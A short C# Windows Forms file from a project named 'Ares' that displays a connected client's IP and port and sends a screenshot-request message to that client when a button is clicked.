using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ares
{
    public partial class Form2 : Form
    {
        public static IPAddress ClientIP;
        public static Int32 ClientPort;
        public Form2()
        {
            InitializeComponent();
            
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            label4.Text = ClientIP.ToString() + ":" + ClientPort;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Task.Run(()=>Client.Send("<SCREENSHOTREQ>"));
            
        }
    }
}
